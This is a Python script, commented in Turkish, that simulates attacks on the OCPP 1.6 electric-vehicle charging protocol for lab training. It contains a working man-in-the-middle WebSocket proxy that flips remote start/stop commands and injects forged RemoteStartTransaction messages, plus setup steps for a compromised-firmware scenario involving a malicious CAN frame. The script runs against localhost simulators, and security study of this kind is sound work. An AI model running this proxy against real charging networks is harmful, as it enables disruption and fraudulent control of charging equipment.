#!/usr/bin/env python3
"""
Saldırı Senaryoları Simülatörü
MitM, mesaj manipülasyonu ve firmware compromise simülasyonları.
"""

import asyncio
import logging
import json
import websockets
from websockets.server import serve
from websockets.client import connect
import re

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class MitMProxy:
    """Man-in-the-Middle Proxy - OCPP mesajlarını yakalar ve manipüle eder"""
    
    def __init__(self, upstream_url: str, listen_port: int = 9001, attack_mode: str = 'none'):
        """
        Args:
            upstream_url: Gerçek CSMS URL'i
            listen_port: Proxy'nin dinleyeceği port
            attack_mode: 'none', 'modify_stop', 'modify_start', 'inject_fake'
        """
        self.upstream_url = upstream_url
        self.listen_port = listen_port
        self.attack_mode = attack_mode
        self.message_count = 0
        
    async def handle_client(self, client_ws, path):
        """Client (CP) bağlantısını işle"""
        logger.info(f"Client bağlandı: {client_ws.remote_address}")
        
        try:
            # Upstream (CSMS) bağlantısı
            async with connect(self.upstream_url, subprotocols=['ocpp1.6']) as upstream_ws:
                logger.info(f"Upstream bağlantısı kuruldu: {self.upstream_url}")
                
                # İki yönlü proxy
                client_to_upstream = asyncio.create_task(
                    self._forward_messages(client_ws, upstream_ws, direction="CP→CSMS")
                )
                upstream_to_client = asyncio.create_task(
                    self._forward_messages(upstream_ws, client_ws, direction="CSMS→CP")
                )
                
                await asyncio.gather(client_to_upstream, upstream_to_client)
                
        except Exception as e:
            logger.error(f"Proxy hatası: {e}")
        finally:
            logger.info("Bağlantı kapatıldı")
    
    async def _forward_messages(self, source, destination, direction: str):
        """Mesajları ilet ve gerekirse manipüle et"""
        try:
            async for message in source:
                self.message_count += 1
                
                # Mesajı logla
                logger.info(f"[{direction}] Mesaj #{self.message_count}: {message[:200]}...")
                
                # Saldırı moduna göre manipüle et
                modified_message = await self._attack_message(message, direction, destination)
                
                # Mesajı ilet
                await destination.send(modified_message)
                
        except websockets.exceptions.ConnectionClosed:
            logger.info(f"{direction} bağlantısı kapandı")
        except Exception as e:
            logger.error(f"{direction} iletim hatası: {e}")
    
    async def _attack_message(self, message: str, direction: str, destination) -> str:
        """Mesajı saldırı moduna göre manipüle et"""
        
        if self.attack_mode == 'none':
            return message
        
        try:
            # OCPP mesajını parse et
            data = json.loads(message)
            action = data[2] if len(data) > 2 else None
            payload = data[3] if len(data) > 3 else {}
            
            if self.attack_mode == 'modify_stop':
                # RemoteStartTransaction'ı RemoteStopTransaction'a çevir
                if action == 'RemoteStartTransaction' and direction == "CSMS→CP":
                    logger.warning("⚠️ SALDIRI: RemoteStartTransaction → RemoteStopTransaction'a dönüştürülüyor!")
                    data[2] = 'RemoteStopTransaction'
                    # Transaction ID'yi payload'dan al veya rastgele oluştur
                    if 'transactionId' not in payload:
                        payload['transactionId'] = 999  # Sahte transaction ID
                    data[3] = payload
                    return json.dumps(data)
            
            elif self.attack_mode == 'modify_start':
                # RemoteStopTransaction'ı RemoteStartTransaction'a çevir
                if action == 'RemoteStopTransaction' and direction == "CSMS→CP":
                    logger.warning("⚠️ SALDIRI: RemoteStopTransaction → RemoteStartTransaction'a dönüştürülüyor!")
                    data[2] = 'RemoteStartTransaction'
                    if 'connectorId' not in payload:
                        payload['connectorId'] = 1
                    if 'idTag' not in payload:
                        payload['idTag'] = 'ATTACK_TAG'
                    data[3] = payload
                    return json.dumps(data)
            
            elif self.attack_mode == 'inject_fake':
                # Sahte RemoteStartTransaction enjekte et
                if action == 'BootNotification' and direction == "CSMS→CP":
                    logger.warning("⚠️ SALDIRI: Sahte RemoteStartTransaction enjekte ediliyor!")
                    # Önce normal mesajı ilet
                    asyncio.create_task(self._inject_fake_message(destination, payload))
            
        except (json.JSONDecodeError, IndexError, KeyError) as e:
            logger.debug(f"Mesaj parse edilemedi (normal olabilir): {e}")
        
        return message
    
    async def _inject_fake_message(self, destination, original_payload):
        """Sahte mesaj enjekte et"""
        await asyncio.sleep(0.5)  # Kısa bir gecikme
        fake_message = json.dumps([
            2,  # CALL
            "fake-msg-id",
            "RemoteStartTransaction",
            {
                "connectorId": 1,
                "idTag": "FAKE_INJECTED_TAG"
            }
        ])
        logger.warning(f"Sahte mesaj enjekte edildi: {fake_message}")
        await destination.send(fake_message)
    
    async def start(self):
        """MitM proxy'yi başlat"""
        logger.info(f"MitM Proxy başlatılıyor...")
        logger.info(f"Listen: ws://localhost:{self.listen_port}")
        logger.info(f"Upstream: {self.upstream_url}")
        logger.info(f"Attack Mode: {self.attack_mode}")
        logger.warning("⚠️ Bu bir saldırı simülasyonudur - yalnızca eğitim amaçlıdır!")
        
        async with serve(self.handle_client, "localhost", self.listen_port, subprotocols=['ocpp1.6']):
            await asyncio.Future()  # Sonsuz döngü


async def scenario_1_plain_ws_mitm():
    """Senaryo 1: Plain WebSocket ile MitM"""
    logger.info("\n" + "="*60)
    logger.info("SENARYO 1: Plain WebSocket MitM Saldırısı")
    logger.info("="*60)
    
    # CSMS'i başlat (normal port 9000)
    # CP'yi proxy üzerinden bağla (port 9001)
    proxy = MitMProxy("ws://localhost:9000", listen_port=9001, attack_mode='modify_stop')
    
    logger.info("\nAdımlar:")
    logger.info("1. CSMS simülatörünü başlatın: python csms_simulator.py")
    logger.info("2. Bu proxy'yi başlatın: python attack_scenarios.py --scenario 1")
    logger.info("3. CP simülatörünü proxy üzerinden bağlayın: python cp_simulator.py CP001 ws://localhost:9001")
    logger.info("4. CSMS'den RemoteStartTransaction gönderin")
    logger.info("5. Proxy mesajı manipüle edip RemoteStopTransaction'a çevirecek\n")
    
    await proxy.start()


async def scenario_2_compromised_firmware():
    """Senaryo 2: Compromised Firmware"""
    logger.info("\n" + "="*60)
    logger.info("SENARYO 2: Compromised Firmware Simülasyonu")
    logger.info("="*60)
    
    logger.info("\nAdımlar:")
    logger.info("1. CSMS simülatörünü başlatın: python csms_simulator.py")
    logger.info("2. CAN bus simülatörünü başlatın: python can_bus_simulator.py")
    logger.info("3. CP simülatörünü compromised mode'da başlatın:")
    logger.info("   python cp_simulator.py CP001 ws://localhost:9000 --compromised")
    logger.info("4. CSMS'den RemoteStartTransaction gönderin")
    logger.info("5. CP, ek olarak malicious CAN frame (0x9FF) gönderecek")
    logger.info("6. Charger modülü hatalı davranış moduna geçecek\n")


async def scenario_3_message_injection():
    """Senaryo 3: Mesaj Enjeksiyonu"""
    logger.info("\n" + "="*60)
    logger.info("SENARYO 3: Mesaj Enjeksiyonu Saldırısı")
    logger.info("="*60)
    
    proxy = MitMProxy("ws://localhost:9000", listen_port=9001, attack_mode='inject_fake')
    
    logger.info("\nAdımlar:")
    logger.info("1. CSMS simülatörünü başlatın: python csms_simulator.py")
    logger.info("2. Bu proxy'yi başlatın: python attack_scenarios.py --scenario 3")
    logger.info("3. CP simülatörünü proxy üzerinden bağlayın: python cp_simulator.py CP001 ws://localhost:9001")
    logger.info("4. Proxy, BootNotification'dan sonra sahte RemoteStartTransaction enjekte edecek\n")
    
    await proxy.start()


async def interactive_test():
    """İnteraktif test - CSMS'e manuel komut gönder"""
    import sys
    
    logger.info("\n" + "="*60)
    logger.info("İNTERAKTİF TEST: CSMS'e Manuel Komut Gönderme")
    logger.info("="*60)
    
    csms_url = "ws://localhost:9000"
    
    try:
        async with connect(f"{csms_url}/CP001", subprotocols=['ocpp1.6']) as ws:
            logger.info(f"CSMS'e bağlandı: {csms_url}")
            
            # BootNotification gönder
            boot_msg = json.dumps([
                2,  # CALL
                "boot-1",
                "BootNotification",
                {
                    "chargePointModel": "TestModel",
                    "chargePointVendor": "TestVendor"
                }
            ])
            await ws.send(boot_msg)
            logger.info("BootNotification gönderildi")
            
            response = await ws.recv()
            logger.info(f"Yanıt: {response}")
            
            # RemoteStartTransaction gönder
            await asyncio.sleep(1)
            start_msg = json.dumps([
                2,
                "start-1",
                "RemoteStartTransaction",
                {
                    "connectorId": 1,
                    "idTag": "TEST_TAG"
                }
            ])
            await ws.send(start_msg)
            logger.info("RemoteStartTransaction gönderildi")
            
            response = await ws.recv()
            logger.info(f"Yanıt: {response}")
            
    except Exception as e:
        logger.error(f"Bağlantı hatası: {e}")


async def main():
    """Ana fonksiyon"""
    import sys
    
    if len(sys.argv) > 1:
        scenario = sys.argv[1]
        
        if scenario == '--scenario' or scenario == '-s':
            scenario_num = sys.argv[2] if len(sys.argv) > 2 else '1'
            
            if scenario_num == '1':
                await scenario_1_plain_ws_mitm()
            elif scenario_num == '2':
                await scenario_2_compromised_firmware()
            elif scenario_num == '3':
                await scenario_3_message_injection()
            else:
                logger.error(f"Bilinmeyen senaryo: {scenario_num}")
        elif scenario == '--test' or scenario == '-t':
            await interactive_test()
        else:
            logger.error(f"Bilinmeyen argüman: {scenario}")
    else:
        logger.info("Kullanım:")
        logger.info("  python attack_scenarios.py --scenario <1|2|3>")
        logger.info("  python attack_scenarios.py --test")
        logger.info("\nSenaryolar:")
        logger.info("  1: Plain WebSocket MitM")
        logger.info("  2: Compromised Firmware")
        logger.info("  3: Message Injection")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Kapatılıyor...")

